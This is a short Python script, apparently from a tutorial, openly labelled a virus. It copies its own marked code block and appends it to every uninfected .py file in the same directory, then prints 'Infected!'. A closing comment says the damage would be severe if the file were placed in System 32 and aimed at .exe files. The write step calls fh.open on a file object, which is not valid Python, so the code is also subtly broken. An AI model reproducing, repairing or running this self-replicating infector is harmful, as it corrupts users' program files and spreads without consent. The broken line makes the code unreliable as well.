#!/usr/bin/env python
####   Begin Virus line  ######
import sys, glob, re


#Get a copy of the virus
vCode = []
fh = open(sys.argv[0], "r")
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if (re.search('####   Begin Virus line  ######',line)): inVirus = True
    if (inVirus): vCode.append(line)
    if(re.search('####    END  Virus line  ######',line)): break

#Find Potential Victims
progs = glob.glob("*.py")

#Check and Infect
for prog in progs:
    fh = open(prog, "r")
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if ('####   Begin Virus line  ######' in line):
            infected = True
            break
    if not infected:
        newCode = []
        if '#!' in pCode[0]: newCode.append(pCode.pop(0))
        newCode.extend(pCode)
        newCode.extend(vCode)
        #Writing new virus infected code
        fh.open(prog,"w")
        fh.writelines(newCode)
        fh.close()
## Oftinal line
print("Infected!")


####    END  Virus line  ######


'''
The file only affects .py programs in the same file that it is in.
The only thing that would screw you is if you put this file in, per say, System 32 and Told it to target .exe files.
Then you would be screwed.
'''
# https://www.youtube.com/watch?v=RJHPGYz2lA4